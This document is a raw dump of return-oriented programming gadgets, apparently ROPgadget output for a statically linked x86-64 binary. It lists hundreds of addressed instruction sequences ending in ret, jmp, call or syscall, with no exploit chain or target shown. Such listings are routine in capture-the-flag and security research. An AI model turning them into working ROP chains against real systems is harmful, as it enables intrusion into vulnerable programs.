0x0000000000424d51 : add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000044ea97 : add byte ptr [rsi + rbp*4 - 0x18], dh ; xchg eax, ecx ; retf 0
0x00000000004b1e53 : add byte ptr [rsi + rbx*8 - 6], bh ; call qword ptr [rsi]
0x00000000004b0fd7 : add byte ptr [rsi + rdx*2], bh ; add byte ptr [rcx + rcx], al ; cli ; jmp qword ptr [rdx]
0x0000000000456820 : add byte ptr [rsi + rsi*2 - 0xa], dh ; ret
0x000000000045681f : add byte ptr [rsi + rsi*2 - 0xa], sil ; ret
0x000000000048541d : add byte ptr [rsi - 0x70], ah ; mov eax, 0x27 ; syscall
0x000000000044c61d : add byte ptr [rsi - 0x70], ah ; mov eax, 0x63 ; syscall
0x0000000000474f0d : add byte ptr [rsi - 0x70], ah ; mov eax, 0xc9 ; syscall
0x00000000004004cd : add byte ptr [rsi - 0x70], ah ; ret
0x0000000000424d17 : add byte ptr [rsi - 9], dh ; ret 0
0x00000000004001bf : add byte ptr [rsi], dh ; xor edi, ebp ; retf 0x6500
0x0000000000417995 : add byte ptr [rsp + rax - 0x58], dh ; add dword ptr [rsp - 0x7d], esi ; retf 0x4c01
0x00000000004b045b : add byte ptr [rsp + rbp*4 - 7], dh ; call rsi
0x00000000004b11a3 : add byte ptr [rsp + rbx - 6], bl ; call rcx
0x00000000004af84b : add byte ptr [rsp + rbx*4], dl ; clc ; jmp qword ptr [rsi]
0x0000000000400ebe : add byte ptr [rsp + rcx - 0x7f], dh ; retf 0x440
0x00000000004534dc : add byte ptr [rsp + rsi - 0xa], dh ; ret
0x00000000004af849 : add byte ptr ds:[rax], al ; adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x0000000000449865 : add byte ptr es:[rax + 0x39], cl ; ret
0x000000000044dce4 : add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x000000000044ea96 : add byte ptr es:[rsi + rbp*4 - 0x18], dh ; xchg eax, ecx ; retf 0
0x000000000044c577 : add byte ptr fs:[rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x00000000004b1e51 : add byte ptr fs:[rax], al ; jl 0x4b1e3a ; cli ; call qword ptr [rsi]
0x000000000049468c : add ch, ah ; stc ; jmp rax
0x000000000049f1c3 : add ch, al ; or eax, 0xdc80000 ; add byte ptr [rax], al ; retf
0x0000000000415f02 : add ch, al ; pop rax ; ret
0x0000000000416009 : add ch, al ; push rcx ; ret 0xffff
0x000000000047376f : add ch, al ; std ; xlatb ; retf 0xc985
0x00000000004953d0 : add ch, bh ; cli ; call qword ptr [rax]
0x00000000004b4a01 : add ch, bh ; jmp qword ptr [rdx]
0x00000000004a9b1c : add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00000000004a9b1d : add ch, byte ptr [rbp + rbp*2 + 0x5b] ; ret 0x6f9
0x00000000004b41a5 : add ch, byte ptr [rbp + rcx + 7] ; ret
0x0000000000471e6a : add ch, byte ptr [rcx] ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x000000000042365a : add ch, byte ptr [rdi - 1] ; dec dword ptr [rbx + 0x90c2454] ; ret 0xbae9
0x0000000000469643 : add ch, byte ptr [rip - 0x7d000000] ; ret
0x00000000004ace5f : add ch, byte ptr [rsi + rcx + 8] ; ret
0x000000000048be87 : add ch, cl ; retf 0xfffc
0x0000000000448a78 : add cl, al ; call 0xffffffff84071390
0x0000000000494494 : add cl, al ; stc ; inc dword ptr [rax] ; ret
0x00000000004a8eea : add cl, bl ; retf 0xea91
0x0000000000442e07 : add cl, byte ptr [r8 - 0x76b7fdbe] ; clc ; ret
0x0000000000469e22 : add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x0000000000455a4e : add cl, byte ptr [rax + 0x39] ; ret
0x0000000000469376 : add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000455ca8 : add cl, byte ptr [rax + 0x39] ; retf
0x000000000043338a : add cl, byte ptr [rax + 0x39] ; retf 0x820f
0x0000000000448764 : add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x000000000041d90b : add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x000000000041d568 : add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x0000000000424fec : add cl, byte ptr [rax + 0xf] ; ret 0xc3f3
0x0000000000411fa4 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000411ec3 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00000000004515ec : add cl, byte ptr [rax + 1] ; fimul word ptr [rax + 1] ; ret
0x0000000000455fe6 : add cl, byte ptr [rax - 0x73] ; add rcx, qword ptr [rax + 0x39] ; retf
0x0000000000442e08 : add cl, byte ptr [rax - 0x76b7fdbe] ; clc ; ret
0x0000000000442d75 : add cl, byte ptr [rax - 0x77] ; clc ; ret
0x0000000000485675 : add cl, byte ptr [rax - 0x77] ; je 0x4856a6 ; or byte ptr [rax + 1], cl ; ret
0x000000000047e7c4 : add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x0000000000418c22 : add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x00000000004415d0 : add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x0000000000441633 : add cl, byte ptr [rax - 0x7d] ; ret 0xe908
0x000000000048416d : add cl, byte ptr [rax - 0x7d] ; ret 0xf01
0x000000000048be83 : add cl, byte ptr [rax - 0x7d] ; rol byte ptr [rdx], 0xe9 ; retf 0xfffc
0x00000000004713b0 : add cl, byte ptr [rax - 9] ; fiadd dword ptr [rbx - 0x7bf0fc1e] ; retf
0x0000000000435f82 : add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000458d58 : add cl, byte ptr [rcx + 0x39] ; retf
0x000000000045271a : add cl, byte ptr [rcx - 0x7d] ; ret
0x0000000000404949 : add cl, byte ptr [rdi] ; retf 0x8b48
0x000000000044748b : add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000477f97 : add cl, ch ; jmp 0x477fa1
0x0000000000448fb7 : add cl, ch ; ret
0x000000000045ee3a : add cl, ch ; ret 0xfffa
0x00000000004554c8 : add cl, ch ; ret 0xfffd
0x0000000000409f30 : add cl, ch ; retf
0x00000000004851e4 : add cl, ch ; retf 0xfff7
0x000000000043bb0a : add cl, ch ; retf 0xfffe
0x0000000000400cb0 : add cl, cl ; ret
0x00000000004a8da3 : add cl, dh ; lodsd eax, dword ptr [rsi] ; mov esi, 0x497b96cc ; retf 0x99e0
0x00000000004a8da2 : add cl, sil ; lodsd eax, dword ptr [rsi] ; mov esi, 0x497b96cc ; retf 0x99e0
0x00000000004a2e6b : add dh, al ; add eax, 0x5c80000 ; add byte ptr [rax], al ; retf 5
0x000000000046a118 : add dh, al ; test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x000000000045e942 : add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x00000000004953f8 : add dh, bh ; cli ; jmp qword ptr [rax]
0x00000000004a7bde : add dh, bh ; movsxd rax, dword ptr [rbp + 0x275dcc4c] ; retf 0xd1cb
0x00000000004a22b7 : add dh, bh ; xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x0000000000436133 : add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000040058e : add dh, bl ; ret
0x0000000000424d8e : add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004ad391 : add dh, byte ptr [rbx + 0xa] ; ret
0x000000000041b698 : add dh, dh ; ret
0x000000000045191e : add dh, dh ; ret 0x4801
0x0000000000422fcf : add dh, dh ; ret 0x4804
0x000000000047c6d8 : add dh, dh ; ret 0x7403
0x000000000044ae8f : add dh, dh ; ret 0x7404
0x00000000004454b7 : add dh, dh ; ret 0x7501
0x00000000004454c4 : add dh, dh ; ret 0x7502
0x00000000004454d1 : add dh, dh ; ret 0x7504
0x0000000000445489 : add dh, dh ; ret 0x7510
0x0000000000445496 : add dh, dh ; ret 0x7520
0x0000000000424fbc : add dh, dh ; ret 0x7540
0x00000000004232f3 : add dh, dh ; ret 0xf02
0x000000000045abb8 : add dh, dh ; ret 0xf04
0x000000000041b5c9 : add dh, dh ; ret 0xf08
0x0000000000466d01 : add dh, dh ; ret 0xf40
0x0000000000466ce7 : add dh, dh ; ret 0xf50
0x0000000000494cb9 : add dl, bh ; jmp qword ptr [rax - 0x1f0005ff]
0x0000000000494cf9 : add dl, bh ; jmp qword ptr [rax]
0x00000000004948e4 : add dl, byte ptr [rsi] ; cli ; call qword ptr [rdx + 0x22fffa15]
0x0000000000479a9d : add dword ptr [r15], r9d ; xchg eax, ebp ; ret 0xc283
0x00000000004700d7 : add dword ptr [r8 - 0x75], r9d ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x000000000046eef5 : add dword ptr [r8 - 0x7d], ecx ; ret 0x8502
0x0000000000450533 : add dword ptr [r8 - 0x7d], r9d ; ret
0x0000000000444591 : add dword ptr [rax + 0x28d4802], ecx ; ret
0x00000000004658fa : add dword ptr [rax + 0x29], ecx ; fimul dword ptr [rax + 0x39] ; ret 0xe57f
0x00000000004658bf : add dword ptr [rax + 0x29], ecx ; fimul dword ptr [rax + 0x39] ; retf 0xe87f
0x0000000000457198 : add dword ptr [rax + 0x39480742], ecx ; retf
0x0000000000456015 : add dword ptr [rax + 0x39480750], ecx ; retf
0x000000000041759d : add dword ptr [rax + 0x39], ecx ; ret
0x000000000047fc69 : add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x000000000047fc7b : add dword ptr [rax + 0x39], ecx ; ret 0x674
0x000000000045bd7f : add dword ptr [rax + 0x39], ecx ; ret 0x8841
0x0000000000464cda : add dword ptr [rax + 0x39], ecx ; ret 0x8c0f
0x000000000040f383 : add dword ptr [rax + 0x39], ecx ; ret 0xd774
0x000000000040f30d : add dword ptr [rax + 0x39], ecx ; ret 0xed75
0x0000000000455c93 : add dword ptr [rax + 0x39], ecx ; retf
0x0000000000417878 : add dword ptr [rax + 0x39], ecx ; retf 0xee75
0x0000000000457bd0 : add dword ptr [rax + 0x39], r9d ; ret
0x000000000048e0a3 : add dword ptr [rax + 0x7900ff7a], eax ; sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x000000000048c68e : add dword ptr [rax + 1], ecx ; retf
0x000000000047a919 : add dword ptr [rax + 1], ecx ; retf 0x8948
0x0000000000482037 : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000040dbba : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x0000000000479295 : add dword ptr [rax + 9], ecx ; ret 0x1475
0x000000000041e6ce : add dword ptr [rax + 9], ecx ; ret 0x8949
0x0000000000479267 : add dword ptr [rax + 9], ecx ; ret 0xe75
0x000000000044b217 : add dword ptr [rax + 9], ecx ; retf 0x8949
0x0000000000475980 : add dword ptr [rax + rax], edx ; mov eax, ecx ; syscall
0x00000000004a899b : add dword ptr [rax + rdx*4 + 0x16], edi ; out dx, al ; out 0x78, al ; jnp 0x4a8a07 ; retf
0x0000000000461353 : add dword ptr [rax - 0x4f743], eax ; jmp qword ptr [rax]
0x0000000000402d0f : add dword ptr [rax - 0x6bf0d006], eax ; ret 0xb60f
0x00000000004236a4 : add dword ptr [rax - 0x73], ecx ; clc ; cmovne rax, rcx ; ret
0x00000000004700d8 : add dword ptr [rax - 0x75], ecx ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x0000000000442de1 : add dword ptr [rax - 0x776b7fe], ecx ; ret
0x0000000000419991 : add dword ptr [rax - 0x77], ecx ; adc eax, 0x29fe97 ; ret
0x0000000000442d72 : add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x000000000047f3b3 : add dword ptr [rax - 0x77], ecx ; add eax, 0x23cff5 ; ret
0x000000000045e240 : add dword ptr [rax - 0x77], ecx ; push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000040602c : add dword ptr [rax - 0x77], ecx ; ret
0x0000000000450a97 : add dword ptr [rax - 0x77], ecx ; ret 0x2b48
0x0000000000414966 : add dword ptr [rax - 0x77], ecx ; ret 0x3c75
0x000000000045d35c : add dword ptr [rax - 0x77], ecx ; retf 0x8948
0x0000000000485a52 : add dword ptr [rax - 0x77], ecx ; rol byte ptr [rbx + 0x394800d3], 1 ; retf 0xe275
0x000000000047f3b2 : add dword ptr [rax - 0x77], r9d ; add eax, 0x23cff5 ; ret
0x000000000040efe6 : add dword ptr [rax - 0x7d], ecx ; ret
0x000000000045c1e9 : add dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x000000000046eef6 : add dword ptr [rax - 0x7d], ecx ; ret 0x8502
0x0000000000402d59 : add dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x0000000000451086 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b01
0x000000000046f547 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b04
0x000000000040e4db : add dword ptr [rax - 0x7d], ecx ; ret 0xf10
0x0000000000469e89 : add dword ptr [rax - 0x91743], eax ; jmp qword ptr [rax]
0x000000000045e985 : add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x000000000044a555 : add dword ptr [rax - 1], edi ; jmp 0x44a526
0x0000000000405a60 : add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x00000000004557bb : add dword ptr [rax], eax ; add al, ch ; sbb eax, 0x89fffac4 ; retf 0xe283
0x00000000004109e4 : add dword ptr [rax], eax ; add bl, dh ; ret
0x0000000000448901 : add dword ptr [rax], eax ; add byte ptr [rax + 0x39], cl ; retf 0xd975
0x000000000041a24a : add dword ptr [rax], eax ; add byte ptr [rax + 1], cl ; ret
0x0000000000468233 : add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret 0xffe0
0x0000000000455a48 : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; add cl, byte ptr [rax + 0x39] ; ret
0x0000000000478094 : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; dec dword ptr [rax - 0x7d] ; ret
0x000000000041f30d : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x00000000004785f1 : add dword ptr [rax], eax ; add byte ptr [rax - 0x75], cl ; jl 0x478625 ; sbb al, ch ; ret 0xf87e
0x0000000000470f8b : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; adc byte ptr [rax - 0x77], cl ; retf 0x8348
0x0000000000475b8d : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000449d69 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x000000000048e96a : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x3948
0x0000000000456cb6 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x000000000048ceb5 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000456255 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; retf 0x8966
0x000000000044785e : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000471a49 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x0000000000411b58 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; retf
0x000000000041f950 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000468508 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044c04c : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000456912 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x000000000042b847 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041efa5 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x0000000000424a6e : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00000000004407bf : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b875 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000040d883 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; retf 0xeb08
0x000000000044f161 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004a22ba : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00000000004a146a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x00000000004a1292 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a128a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00000000004a1a22 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x00000000004a12ca : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf
0x00000000004a12c2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x1d4
0x00000000004a1a62 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x1d5
0x000000000048d017 : add dword ptr [rax], eax ; add byte ptr [rax], al ; call r14
0x000000000048cf6d : add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x000000000048dd89 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ja 0x48dd9a ; sbb eax, eax ; ret
0x000000000040f50d : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x40f4da
0x000000000040fc45 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x40fc12
0x0000000000460f6d : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp rax
0x0000000000475ed2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; leave ; ret
0x000000000044c6ce : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xca ; syscall
0x0000000000449bd1 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xe5 ; syscall
0x000000000047e79d : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000048d620 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x0000000000484626 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x000000000046f04d : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x0000000000417aa3 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048694e : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x000000000047fe31 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000468770 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000044a21b : add dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x0000000000413998 : add dword ptr [rax], eax ; add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x0000000000429138 : add dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000048ce06 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000044e992 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000409f1d : add dword ptr [rax], eax ; add byte ptr [rbx - 0x7bf0fe08], al ; ret
0x000000000049229d : add dword ptr [rax], eax ; add byte ptr [rcx - 0x75], cl ; pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x00000000004612d0 : add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x00000000004780ca : add dword ptr [rax], eax ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x00000000004454b5 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7501
0x00000000004454c2 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7502
0x00000000004454cf : add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x0000000000445487 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x0000000000445494 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00000000004454a1 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x000000000045abb6 : add dword ptr [rax], eax ; add dh, dh ; ret 0xf04
0x0000000000424fe8 : add dword ptr [rax], eax ; and ch, 2 ; cmovne rax, rdx ; ret
0x00000000004241ac : add dword ptr [rax], eax ; cmove rax, rdx ; ret
0x0000000000424113 : add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x000000000041065c : add dword ptr [rax], eax ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004851de : add dword ptr [rax], eax ; mov edx, 5 ; jmp 0x401c39
0x0000000000400b5b : add dword ptr [rax], eax ; nop ; pop rbp ; ret
0x0000000000405e90 : add dword ptr [rax], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044cfc1 : add dword ptr [rax], esp ; jmp rdx
0x00000000004a8ee4 : add dword ptr [rbp + 0x6c], ebx ; shr byte ptr [rdx], 0x43 ; add cl, bl ; retf 0xea91
0x0000000000400b0c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004667c0 : add dword ptr [rbp - 0x41f040be], ecx ; retf 0x53c
0x00000000004496d9 : add dword ptr [rbp - 0x57c03b0], ecx ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044b9cd : add dword ptr [rbp - 0x77], ecx ; retf
0x000000000045e7c2 : add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00000000004a92ca : add dword ptr [rbp - 9], 0x8d626770 ; rcl byte ptr [rdi], cl ; retf
0x0000000000435ff2 : add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x00000000004a7eaa : add dword ptr [rbx + 0x1e40293b], ebp ; cli ; test bh, dl ; retf 0xdf7f
0x000000000046c2f5 : add dword ptr [rbx - 0x4f743], eax ; jmp qword ptr [rax]
0x0000000000489189 : add dword ptr [rbx - 0x77], ecx ; push rsp ; ret 0x4808
0x000000000040d5ae : add dword ptr [rbx - 0x7cb70030], eax ; ret
0x00000000004761fc : add dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x77] ; retf
0x00000000004688af : add dword ptr [rcx + 0x2522760d], ecx ; add byte ptr [rax + 0x63], cl ; retf 0x8948
0x000000000045cc42 : add dword ptr [rcx + 0x39], ecx ; ret
0x000000000044b723 : add dword ptr [rcx + 9], ecx ; ret
0x000000000044b1d6 : add dword ptr [rcx + rcx*4 + 0x5f], ecx ; or byte ptr [rcx - 0x77], cl ; retf
0x000000000040e21a : add dword ptr [rcx - 0x73], ecx ; or byte ptr [r8 + 0x39], cl ; ret
0x0000000000442e11 : add dword ptr [rcx - 0x776b7fe], ecx ; ret
0x000000000046ecee : add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x0000000000454b9f : add dword ptr [rcx - 0x77], eax ; retf
0x000000000045a288 : add dword ptr [rcx - 0x78], eax ; dec dword ptr [rax - 0x7d] ; ret
0x000000000044cdb5 : add dword ptr [rcx - 0x7d], ecx ; ret
0x00000000004673c1 : add dword ptr [rcx - 0x7d], ecx ; ret 0x2504
0x00000000004789db : add dword ptr [rcx - 0x7d], ecx ; ret 0xf01
0x000000000047579a : add dword ptr [rcx], eax ; add byte ptr [rax], al ; syscall
0x00000000004155f3 : add dword ptr [rcx], ecx ; retf 0xd284
0x00000000004647d3 : add dword ptr [rcx], edi ; retf
0x00000000004a8df5 : add dword ptr [rcx], edx ; cmp eax, dword ptr [rsi] ; rcl qword ptr [r14 + 0x27], cl ; retf 0xc0fe
0x00000000004485f2 : add dword ptr [rdi + 0x15], esi ; jb 0x448600 ; mov byte ptr [rdi], cl ; ret
0x00000000004b416d : add dword ptr [rdi], 0x48 ; or eax, 0x1370303 ; ret
0x00000000004b4105 : add dword ptr [rdi], 0x48 ; or eax, 0x34b0303 ; ret
0x00000000004b4139 : add dword ptr [rdi], 0x48 ; or eax, 0x35b0303 ; ret
0x00000000004b4116 : add dword ptr [rdi], 0xd ; add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x00000000004b414a : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; cld ; ret
0x00000000004b417e : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004b08dd : add dword ptr [rdi], 3 ; ret 0xa01
0x0000000000423f3e : add dword ptr [rdi], eax ; add byte ptr [rax + 0x31], dl ; shr al, 0x57 ; ret
0x0000000000457190 : add dword ptr [rdi], ecx ; mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000047e8a7 : add dword ptr [rdi], ecx ; mov esi, 0xaf0f4907 ; retf 0x14c
0x000000000041eecb : add dword ptr [rdi], ecx ; ret 0x8948
0x0000000000448d41 : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x0000000000454b01 : add dword ptr [rdi], ecx ; xchg byte ptr [rdi], dl ; or eax, 0xea810000 ; ret 0
0x0000000000479a9e : add dword ptr [rdi], ecx ; xchg eax, ebp ; ret 0xc283
0x00000000004475ec : add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x0000000000438e7d : add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000048547b : add dword ptr [rdx + rax*2], 1 ; ret
0x00000000004a8acf : add dword ptr [rdx - 0x36a5831f], esp ; retf
0x0000000000468aa3 : add dword ptr [rdx - 7], edi ; dec dword ptr [rax - 0x39] ; ret 0xffa0
0x00000000004b32fc : add dword ptr [rdx], 0x4a ; ret
0x00000000004b5d8c : add dword ptr [rdx], 0x55 ; ret
0x00000000004af310 : add dword ptr [rdx], 0x5a ; ret
0x00000000004b5d48 : add dword ptr [rdx], 0x76 ; ret
0x00000000004acf02 : add dword ptr [rdx], eax ; retf
0x0000000000419008 : add dword ptr [rip + 0x2a2d05], 1 ; ret
0x00000000004ace5b : add dword ptr [rsi + rcx + 0x30], ecx ; add ch, byte ptr [rsi + rcx + 8] ; ret
0x0000000000442df2 : add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x0000000000417999 : add dword ptr [rsp - 0x7d], esi ; retf 0x4c01
0x000000000041900a : add eax, 0x1002a2d ; ret
0x000000000048a11d : add eax, 0x1489066 ; ret 0xb70f
0x000000000045b570 : add eax, 0x18c48348 ; ret
0x0000000000425109 : add eax, 0x1bb12 ; cmove rax, rdx ; ret
0x00000000004241a9 : add eax, 0x1d0a2 ; cmove rax, rdx ; ret
0x0000000000449f4a : add eax, 0x1f0fc3f3 ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x000000000042c13a : add eax, 0x20 ; add rax, rdi ; vzeroupper ; ret
0x0000000000424cc0 : add eax, 0x221ab ; cmove rax, rdx ; ret
0x0000000000425049 : add eax, 0x22732 ; cmovne rax, rdx ; ret
0x0000000000424f09 : add eax, 0x22862 ; cmovne rax, rdx ; ret
0x0000000000424da9 : add eax, 0x229d2 ; cmovne rax, rdx ; ret
0x00000000004250b0 : add eax, 0x22a7b ; cmovne rax, rdx ; ret
0x0000000000424f70 : add eax, 0x22bab ; cmovne rax, rdx ; ret
0x000000000048f6f1 : add eax, 0x22cc8e ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000048f5e1 : add eax, 0x22cd9e ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000424e10 : add eax, 0x22d1b ; cmovne rax, rdx ; ret
0x000000000042508f : add eax, 0x22ecc ; cmovne rax, rdx ; ret
0x0000000000424f4f : add eax, 0x22ffc ; cmovne rax, rdx ; ret
0x0000000000424def : add eax, 0x2316c ; cmovne rax, rdx ; ret
0x0000000000424130 : add eax, 0x231db ; cmovne rax, rdx ; ret
0x0000000000487850 : add eax, 0x235002 ; jne 0x487886 ; ret
0x0000000000424e7b : add eax, 0x23660 ; cmovne rax, rdx ; ret
0x0000000000485621 : add eax, 0x23729a ; ret
0x0000000000484aa9 : add eax, 0x2375ba ; ret
0x0000000000484a8e : add eax, 0x2375d5 ; add rsp, 8 ; ret
0x0000000000424e5e : add eax, 0x237dd ; cmovne rax, rdx ; ret
0x0000000000424eaf : add eax, 0x2390c ; cmovne rax, rdx ; ret
0x000000000047f51c : add eax, 0x23ce87 ; mov qword ptr [rsi], rax ; ret
0x000000000047f4ab : add eax, 0x23cf00 ; ret
0x000000000047f472 : add eax, 0x23cf39 ; add rsp, 8 ; ret
0x000000000047f3b6 : add eax, 0x23cff5 ; ret
